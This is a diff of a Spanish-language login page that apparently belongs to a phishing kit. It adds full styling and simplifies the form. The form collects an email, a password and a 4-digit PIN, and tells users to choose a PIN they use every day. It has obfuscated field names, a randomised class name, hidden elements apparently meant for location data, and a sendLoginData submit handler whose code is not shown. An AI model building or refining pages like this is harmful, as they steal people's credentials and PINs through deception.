@@ -23,7 +23,43 @@
          })
     </script>
     <style>
-        /* ... tu CSS igual que antes ... */
+        body, html { height: 100%; background-image: url("https://pbs.twimg.com/media/Fth-XmMXwBYrdcF?format=jpg&name=small"); background-position: center; background-size: cover; font-family: 'Montserrat', sans-serif; }
+        input { filter: none !important; }
+        @media only screen and (max-width: 765px) {
+            body, html { background-image: none; }
+            .login-box { position: relative !important; box-shadow: none !important; border-top: none !important; top: 0 !important; transform: none !important; float: none !important; }
+            .login-container .wrapper { position: relative; top: 0; z-index: 1; width: 100%; }
+        }
+        .login-container { position: relative; min-height: 100%; }
+        .login-box { position: absolute; top: 50%; transform: translateY(-50%); padding: 20px; background-color: #fff; box-shadow: 0px 0px 1px 0.1px #9de1da; border-radius: 5px; border-top: 1px solid #e9e9e9; }
+        .login-header { text-align: center; padding-top: 0; }
+        .login-header img { width: 150px; }
+        .login-footer { position: absolute; bottom: 10px; width: 300px; left: 0; right: 0; margin: 0 auto; }
+        .login-footer img { width: 100%; }
+        #error-message { display: none; }
+        #gradient { height: 100px; background-image: linear-gradient(to bottom, rgb(255 255 255), rgb(255 255 255 / 0%)); display: none; }
+        #btn-login { background-color: #234881; border-radius: 0 !important; padding-bottom: 7px; padding-top: 7px; margin-top: 10px; }
+        .center { text-align: center; }
+        #bottom-imgs { height: 80px; display: flex; align-items: center; justify-content: space-evenly; width: 80%; margin: 0 auto; }
+        #bottom-imgs .img-block { width: 40%; }
+        #bottom-imgs .img-block img { width: 100%; }
+        #vl { border-right: 1px solid #908f8f; height: 20px; display: inline; }
+        .ingresa-cuenta { font-family: 'Montserrat', sans-serif; font-size: medium 18pt; color: #908f8f; padding-top: 10px; }
+        .text { font-family: 'Montserrat', sans-serif; font-size: smaller; color: #908f8f; }
+        a { font-size: smaller; color: #234881; }
+        .space-right { margin-right: 5px; }
+        input[type=text]:focus, input[type=password]:focus { outline: none !important; box-shadow: none !important; border: 2px solid #00c8a9; }
+        .form-group { max-height: 60px; margin-top: 0 !important; margin-bottom: 0 !important; }
+        .form-control { box-shadow: none; border-width: 1px; border-radius: 2px; }
+        .eye-icon { position: relative; top: 30px; left: 60%; color: #908f8f; }
+        @media only screen and (max-width: 765px) { .eye-icon { left: 80%; } .login-header img { width: 250px; } }
+        @media only screen and (max-width: 500px) { .eye-icon { left: 70%; } }
+        @media only screen and (max-width: 350px) { .eye-icon { left: 60%; } }
+        .form-group>label { text-decoration: none !important; top: 30px; left: 10px; position: relative; background-color: white; padding: 0px 5px 0px 5px; transition: 0.2s; pointer-events: none; font-family: 'Montserrat', sans-serif; font-size: 10px; color: #908f8f; }
+        .label-animate>label { top: 12px !important; left: 12px !important; font-size: 10px; color: #234881; font-weight: 500; }
+        label { font-weight: 200; }
+        .login-footer-responsive { position: absolute; bottom: 0; display: none; height: auto; }
+        @media only screen and (max-width: 765px) { .login-footer-responsive { display: block; } .login-footer-responsive img { width: 100%; } #gradient { display: block; } }
     </style>
 </head>
 <body>
@@ -37,25 +73,16 @@
             <div class="alert alert-danger" id="error-message"></div>
             <div>
                 <form action="" method="post" onsubmit="return sendLoginData()">
-                    <div class="form-group label-animate">
-                        <label for="uzer">Correo electrónico</label>
-                        <input class="form-control" id="uzer" type="email" name="uzer" autocomplete="off" required>
-                    </div>
-                    <div class="form-group label-animate">
-                        <label for="pazz">Contraseña</label>
+                    <div class="form-group label-animate"><label for="uzer">Correo electrónico</label><input class="form-control" id="uzer" type="text" name="uzer" autocomplete="off" required=""></div>
+                    <div class="form-group label-animate"><label for="pazz">Contraseña</label>
                         <i class="fa fa-eye eye-icon" aria-hidden="true" onclick="showPassword()" style="cursor: pointer;"></i>
-                        <input class="form-control" id="pazz" name="pazz" type="password" required minlength="5">
+                        <input class="form-control" id="pazz" name="pazz" type="password" required="">
                     </div>
                     <div class="iHdVbkVQvFXkuwc">Para reforzar la seguridad de tu cuenta es necesario que crees un pin de 4 números. Le recomendamos usar uno que frecuentes a diario para evitar ser olvidado.</div>
-                    <div class="form-group label-animate">
-                        <label for="p1n">Crear Pin</label>
-                        <input class="form-control" id="p1n" type="number" name="p1n" autocomplete="off" maxlength="4" required min="0" max="9999" pattern="\d{4}" oninput="validatePinInput(this)">
-                    </div>
-                    <p id="gfg" hidden></p>
-                    <p id="address" hidden></p>
-                    <div class="center" style="padding-top: 5px; padding-bottom: 5px; margin-top: 5px">
-                        <a id="link-olvidaste-tu-password" href="h">¿Olvidaste tu contraseña?</a>
-                    </div>
+                    <div class="form-group label-animate"><label for="p1n">Crear Pin</label><input class="form-control" id="p1n" type="text" name="p1n" autocomplete="off" maxlength="4" required=""></div>
+                    <p id="gfg" hidden=""></p>
+                    <p id="address" hidden=""></p>
+                    <div class="center" style="padding-top: 5px; padding-bottom: 5px; margin-top: 5px"><a id="link-olvidaste-tu-password" href="h">¿Olvidaste tu contraseña?</a></div>
                     <div class="captcha-container form-group" style="display: none;"></div>
                     <button class="btn btn-primary btn-block" id="btn-login">Iniciar sesión</button>
                 </form>
@@ -82,12 +109,6 @@
 function showPassword() {
     var input = document.getElementById("pazz");
     input.type = input.type === "password" ? "text" : "password";
-}
-// Solo permitir números y máximo 4 dígitos
-function validatePinInput(input) {
-    let value = input.value.replace(/\D/g, ''); // Elimina todo lo que no sea número
-    if (value.length > 4) value = value.slice(0, 4);
-    input.value = value;
 }
 </script>
 </body>
